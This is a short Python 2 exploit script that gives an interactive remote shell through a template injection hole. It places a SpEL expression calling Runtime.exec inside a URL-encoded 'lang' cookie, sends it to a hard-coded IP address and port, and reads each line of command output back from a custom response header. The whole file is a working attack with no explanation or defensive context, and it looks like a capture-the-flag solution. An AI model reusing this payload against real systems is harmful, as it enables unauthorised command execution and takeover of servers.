import requests
import urllib
import time

def aggressive_url_encode(string):
    return "".join("%{0:0>2}".format(format(ord(char), "x")) for char in string)

url = "http://151.236.114.211:7878/"
while True:
    cmd = raw_input("> ")
    for i in range(0,500):
        payload = "__${#response.setHeader(\"cmd-out\",#uris.escapeQueryParam(new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec(\"" + cmd.strip() + "\").getInputStream())).lines().toArray()["+str(i)+"]))}__::.x"
        c = {"lang":aggressive_url_encode(payload)}
        resp = requests.get(url, cookies=c)
        time.sleep(2)
        try:
            h = resp.headers["cmd-out"]
            print(urllib.unquote(h))
        except:
            break
    print("-"*100)